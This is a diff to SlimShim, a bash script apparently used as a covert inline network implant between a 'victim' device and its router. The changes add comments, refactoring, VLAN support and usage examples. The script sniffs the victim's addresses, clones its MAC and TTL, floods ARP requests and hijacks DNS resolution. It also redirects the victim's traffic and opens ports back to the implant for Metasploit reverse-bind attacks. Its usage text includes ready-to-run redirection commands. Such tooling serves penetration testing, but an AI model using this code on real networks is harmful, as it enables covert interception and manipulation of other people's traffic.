@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20160717 Kirby
+# 20160718 Kirby
 
 ################################################################################
 # LICENSE
@@ -37,6 +37,7 @@ function do_guess() {
     local scapy=0
     local dumpargs="tcp and not ether src ${ARGS[mymac]} and not ether dst ${ARGS[mymac]} and not ether src ff:ff:ff:ff:ff:ff and not ether dst ff:ff:ff:ff:ff:ff and not port 68 and not port 67 and not port 137 and not port 139 and not ip6 and not host ${ARGS[myip]} and not net 224.0.0.0/4 and not net 169.254.0.0/16 and not host 0.0.0.0"
 
+    # We are going to look for inbound packets on eth1 where the victim device should be plugged in
 	# OpenWRT's tcpdump uses -P for direction.  Other distros use -Q
     tcpdump --help 2>&1 |grep -q '\-P' && dirarg='-P in'
     tcpdump --help 2>&1 |grep -q '\-Q' && dirarg='-Q in'
@@ -58,6 +59,8 @@ function do_guess() {
         sip=$(echo $sniff |sed -e 's/.* \([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\)\.[0-9]* > .*/\1/')
         smac=$(echo $sniff |awk '{print $2}')
         ttl=$(echo $sniff |sed -e 's/.* ttl \([0-9]*\), .*/\1/')
+
+        # Sanity checks
         if ! echo $sip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"; then
             echo "# BAD SIP $sip"
             echo "# Gonna loop again"
@@ -73,11 +76,12 @@ function do_guess() {
             echo "# Gonna loop again"
             continue
         fi
-
         if [ $ttl -lt 64 ]; then
             echo "# WARNING: ttl $ttl is probably not right.  This may be a bad sniff.  Setting to 64"
             ttl=64
         fi
+
+        # Detect if this is an 802.1q network and grab the vlan id.
         if echo $sniff |grep -q ' vlan '; then
             vlan=$(echo $sniff |sed -e 's/.* vlan \([0-9]*\), .*/\1/')
             if ! echo $vlan |egrep -q "^[0-9]+$"; then 
@@ -93,7 +97,7 @@ function do_guess() {
         echo "ttl=$ttl"
         echo "vlan=$vlan"
 
-        # Now sniff for inbound with a non-default ttl to get router mac.  Anything that hopped has decremented ttl.
+        # Now sniff for packets with a non-default ttl to get router mac.  Anything that hopped has decremented ttl.
 		# Also assume that network is /24 and ignore local traffic as an extra precaution.
 		netguess="${sip%.*}.0"
         echo "netguess=$netguess/24"
@@ -123,10 +127,12 @@ function do_guess() {
     echo "# Wait until victim arp queries the router mac"
     echo "#      OR unplug and replug ethernet (to victim) to run quicker"
     while :; do
-        led='/sys/class/leds/nexx:blue:power/brightness'
-        if [ -f $led ]; then
+
+        # Do a 1 second off, 2 seconds on blink of power led
+        if [ -f "/sys/class/leds/nexx:blue:power/brightness" ]; then
+            led="/sys/class/leds/nexx:blue:power/brightness"
             touch /tmp/blink
-            blinkled $led & 
+            blinkled $led &
         fi
         
         # On some devices you can run ip link dev down/up to simulate the unplug, but it will break on OpenWRT/LEDE
@@ -143,7 +149,8 @@ function do_guess() {
 
         # Send arp request via scapy if we have it.
         # Background it so we can catch it on the next tcpdump
-        # YOU MAY WANT TO DISABLE THIS.  This may cause the victim to alert to an IP collision.  Up to you.
+        # YOU MAY WANT TO DISABLE THIS.  
+        # This will flood the guessed network with arp requests in hopes of finding the router ip to match the route mac
         if which scapy >/dev/null 2>&1; then
             scapy=1
             echo "# Sending arp via scapy to the assumed network $netguess/24"
@@ -155,7 +162,6 @@ function do_guess() {
         fi
 
         # 21:33:32.482541 ARP, Reply 192.168.1.1 is-at 68:05:ca:32:5e:85, length 46
-        #sniff=$(tcpdump -c1 -nni br-lan ether src $rmac and ether dst $smac and arp 2>/dev/null)
         echo "#"
         echo "# You may want to spoof arp requests with scapy"
         echo "# Run this in another terminal:"
@@ -182,7 +188,7 @@ function do_guess() {
     if [ $scapy == 1 ]; then
         kill %1 >/dev/null 2>&1
     fi
-    if [ -f $led ]; then
+    if [ -f "/tmp/blink" ]; then
         rm /tmp/blink
         echo 0 > $led
     fi
@@ -207,19 +213,32 @@ function blinkled() {
 }
 ################################################################################
 function do_getdns() {
+    local dns
+    local sniff
+
+    # First add Google DNS so we can do resolution before we see requests
     echo 'nameserver 8.8.8.8' > /etc/resolv.conf
+
+    # Disable dnsmasq because it will overwrite our settings
     /etc/init.d/dnsmasq stop >/dev/null 2>&1
-    sniff=$(tcpdump -c1 -nni br-lan "not ip6 and udp and port 53" 2>/dev/null)
-    # 04:40:30.876500 IP 192.168.1.19.59369 > 192.168.1.1.53: 13937+ A? cnn.com. (25)
-    dns=$(echo $sniff |awk '{print $5}' |cut -d'.' -f1-4)
-    grep -q $dns /etc/resolv.conf
-    if [ $? != 0 ]; then
-        echo "nameserver $dns" > /etc/resolv.conf
-    fi
-    grep -q 8.8.8.8 /etc/resolv.conf
-    if [ $? != 0 ]; then
-        echo "nameserver 8.8.8.8" >> /etc/resolv.conf
-    fi
+    systemctl stop dnsmasq >/dev/null 2>&1
+    service dnsmasq stop >/dev/null 2>&1
+    pkill dnsmasq >/dev/null 2>&1
+
+    # Loop the sniffer until we have a valid IP and make it the primary nameserver
+    while ! echo $dns |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"; do
+        sniff=$(tcpdump -c1 -nni br-lan "not ip6 and udp and dst port 53" 2>/dev/null)
+        # 04:40:30.876500 IP 192.168.1.19.59369 > 192.168.1.1.53: 13937+ A? cnn.com. (25)
+        dns=$(echo $sniff |sed -e 's/.* > \([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\)\.[0-9]*: .*/\1/')
+        grep -q $dns /etc/resolv.conf
+        if [ $? != 0 ]; then
+            echo "nameserver $dns" > /etc/resolv.conf
+        fi
+        grep -q 8.8.8.8 /etc/resolv.conf
+        if [ $? != 0 ]; then
+            echo "nameserver 8.8.8.8" >> /etc/resolv.conf
+        fi
+    done
 }
 ################################################################################
 function do_arpwatch()
@@ -230,6 +249,8 @@ function do_arpwatch()
     local sniff
     local brdev
 
+    # This is a forever loop.  
+    # We continuously watch for arps and add to the arptable and route table.
     while :; do
         if brctl show |grep -q br-lan; then
             sniff=$(tcpdump -v -e -c1 -nni br-lan arp 2>/dev/null)
@@ -250,10 +271,14 @@ function do_arpwatch()
                 mac=$(echo $sniff |awk '{print $2}')
                 ip=$(echo $sniff |sed -e 's/.* tell \(.*\), .*/\1/')
             fi
-            if [ x$ip != 'x' ] && [ x$mac != 'x' ] && [ $ip != '0.0.0.0' ] && [ $mac != 'ff:ff:ff:ff:ff:ff' ]; then
-                if ip neigh |egrep  "^$ip " |grep -q $mac; then
-                    true
-                else
+            if [ x$ip != 'x' ] \
+            && [ x$mac != 'x' ] \
+            && [ $ip != ${ARGS[myip]} ] \
+            && [ $ip != '0.0.0.0' ] \
+            && [ $mac != ${ARGS[mymac]} ] \
+            && [ $mac != 'ff:ff:ff:ff:ff:ff' ]
+            then
+                if ! ip neigh |egrep  "^$ip " |grep -q $mac; then
                     echo $sniff
                     echo "adding arp for $ip and $mac"
                     ip neigh replace $ip lladdr $mac dev $brdev >/dev/null 2>&1
@@ -273,7 +298,11 @@ function redirectEgressIP()
     if [ x${ARGS[newdip]} == 'x' ]; then
         ARGS[newdip]=${ARGS[myip]}
     fi
-    if [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[origdip]} == 'x' ] || [ x${ARGS[newdip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+    if [ x${ARGS[sip]} == 'x' ] \
+    || [ x${ARGS[origdip]} == 'x' ] \
+    || [ x${ARGS[newdip]} == 'x' ] \
+    || [ x${ARGS[mymac]} == 'x' ]
+    then
         echo "FAILURE: invalid args"
         exit 1
     fi
@@ -285,7 +314,13 @@ function redirectEgressIP()
 function redirectEgressPort()
 {
 # redirect outbound traffic from victim($sip) to destination($dip) for port $dstport
-    if [ x${ARGS[dstport]} == 'x' ] || [ x${ARGS[proto]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[origdip]} == 'x' ] || [ x${ARGS[newdip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+    if [ x${ARGS[dstport]} == 'x' ] \
+    || [ x${ARGS[proto]} == 'x' ] \
+    || [ x${ARGS[sip]} == 'x' ] \
+    || [ x${ARGS[origdip]} == 'x' ] \
+    || [ x${ARGS[newdip]} == 'x' ] \
+    || [ x${ARGS[mymac]} == 'x' ]
+    then
         echo "FAILURE: invalid args"
         exit 1
     fi
@@ -296,7 +331,13 @@ function redirectEgressPort()
 ################################################################################
 function redirectIngressPort() {
 # redirect traffic going to victim IP($sip) on $rdrport to the SlimShim on $dstport
-    if [ x${ARGS[proto]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[rdrport]} == 'x' ] || [ x${ARGS[dstport]} == 'x' ] || [ x${ARGS[myip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+    if [ x${ARGS[proto]} == 'x' ] \
+    || [ x${ARGS[sip]} == 'x' ] \
+    || [ x${ARGS[rdrport]} == 'x' ] \
+    || [ x${ARGS[dstport]} == 'x' ] \
+    || [ x${ARGS[myip]} == 'x' ] \
+    || [ x${ARGS[mymac]} == 'x' ]
+    then
         echo "FAILURE: invalid args"
         exit 1
     fi
@@ -307,7 +348,13 @@ function redirectIngressPort() {
 ################################################################################
 function redirectIngressPorts() {
 # redirct multiple ports(begin:end) to SlimShim.  Useful for reverse-bind attacks in Metasploit
-    if [ x${ARGS[proto]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[rdrport]} == 'x' ] || [ x${ARGS[dstport]} == 'x' ] || [ x${ARGS[myip]} == 'x' ] || [ x${ARGS[mymac]} == 'x' ]; then
+    if [ x${ARGS[proto]} == 'x' ] \
+    || [ x${ARGS[sip]} == 'x' ] \
+    || [ x${ARGS[rdrport]} == 'x' ] \
+    || [ x${ARGS[dstport]} == 'x' ] \
+    || [ x${ARGS[myip]} == 'x' ] \
+    || [ x${ARGS[mymac]} == 'x' ]
+    then
         echo "FAILURE: invalid args"
         exit 1
     fi
@@ -318,7 +365,11 @@ function redirectIngressPorts() {
 ################################################################################
 function addLan() {
 # add a lan to the shim, e.g. wifi or openvpn on the SlimShim device
-    if [ x${ARGS[lan]} == 'x' ] || [ x${ARGS[sip]} == 'x' ] || [ x${ARGS[rip]} == 'x' ] || [ x${ARGS[dynports]} == 'x' ]; then
+    if [ x${ARGS[lan]} == 'x' ] \
+    || [ x${ARGS[sip]} == 'x' ] \
+    || [ x${ARGS[rip]} == 'x' ] \
+    || [ x${ARGS[dynports]} == 'x' ]
+    then
         echo "FAILURE: invalid args"
         exit 1
     fi
@@ -335,10 +386,14 @@ function addLan() {
 function do_usage()
 {
     cat <<EOF
+########
+WARNING: YOU MUST PLUG THE VICTIM DEVICE INTO ETH1 (ETH0.2 ON NEXX SHIMS)
+########
+
 To shim a box:
 $0 shim --smac=<victim mac> --sip=<victim ip> --rmac=<router mac> --rip=<routerip>
 
-To prepare SlimShim with a bridge (automatically done when shim is run)
+To prepare SlimShim with a bridge (automatically done when shim/autoshim is run)
 $0 prep
 
 Guess the IP/MAC of victim and router
@@ -351,6 +406,23 @@ Watch for arps and populate arp table.
 This is absolutely required after the shim is run, otherwise your SlimShim will not be able to connect to anything.
 I recommend you run this in screen: screen -dmS arpwatch $0 arpwatch
 $0 arpwatch
+
+Add my wifi network so I can route through the SlimShim (192.0.0.0/24 is an RFC 5736 private network)
+$0 addLan --lan=192.0.0.0/24 --envfile=/root/slimshim.env 
+
+Redirect inbound 2501 to ssh on SlimShim
+$0 redirectIngressPort --proto=tcp --rdrport=2501 --dstport=22 --envfile=/root/slimshim.env 
+
+Redirect outbound to 1.1.1.1 to SlimShim
+$0 redirectEgressIP --origdip=1.1.1.1 --envfile=/root/slimshim.env 
+
+Redirect outbound to bing.com for http to google.com
+$0 redirectEgressPort --envfile=/root/slimshim.env --origdip=204.79.197.200 --newdip=172.217.4.110 --proto=tcp --dstport=80
+
+Watch for DNS requests and update resolv.conf
+Google DNS is hardcoded in this function, so remove it if you don't like it.
+screen -dmS getdns $0 getdns
+
 
 EOF
     exit 1
@@ -423,8 +495,8 @@ function do_runprep() {
     ip link set dev br-lan address ${ARGS[mymac]} arp off || gotofail=1
     #route add default dev br-lan >/dev/null 2>&1
 
-    while ip route |grep -q 'default via'; do
-        defaultroute=$(ip route |grep 'default via' |head)
+    while ip route |grep -q default; do
+        defaultroute=$(ip route |grep default |head)
         ip route delete $defaultroute >/dev/null 2>&1
     done
 
@@ -451,9 +523,7 @@ function do_shim()
     
     if [ x${ARGS[vlan]} != 'x' ]; then
         modprobe 8021q >/dev/null 2>&1
-        if lsmod |grep -q 8021q; then
-            true
-        else
+        if ! lsmod |grep -q 8021q; then
             echo "FAILURE: you need to install 8021q kernel module"
             exit 1
         fi
@@ -511,7 +581,10 @@ function do_shim()
     ip neigh replace ${ARGS[rip]} lladdr ${ARGS[rmac]} dev $brdev >/dev/null 2>&1
     
     # mimic the ttl
-    iptables -t mangle -A POSTROUTING -o $brdev -j TTL --ttl-set ${ARGS[ttl]}
+    # Note: this will fail on OpenWRT/LEDE until they upgrade
+    if [ x${ARGS[ttl]} != 'x' ]; then
+        iptables -t mangle -A POSTROUTING -o $brdev -j TTL --ttl-set ${ARGS[ttl]}
+    fi
 
     ip route add ${ARGS[sip]} dev $brdev >/dev/null 2>&1
     ip route add ${ARGS[rip]} dev $brdev >/dev/null 2>&1
@@ -638,6 +711,10 @@ for i in "$@"; do
             ARGS[lan]="${i#*=}"
             shift
             ;;
+        --vlan=*)
+            ARGS[vlan]="${i#*=}"
+            shift
+            ;;
         --help|-h|--usage)
             do_usage
             shift
@@ -670,7 +747,11 @@ ARGS[rdrports]='27000:32000'
 # $dynports needs '-' and $rdrports needs ':'.   Blame it on netfilter.
 
 if [ $COMMAND == 'do_shim' ]; then
-    if [ x$sip == 'x' ] || [ x$smac == 'x' ] || [ x$rip == 'x' ] || [ x$rmac == 'x' ]; then
+    if [ x$sip == 'x' ] \
+    || [ x$smac == 'x' ] \
+    || [ x$rip == 'x' ] \
+    || [ x$rmac == 'x' ]
+    then
         echo "FAILURE: missing arguments"
         exit 1
     fi
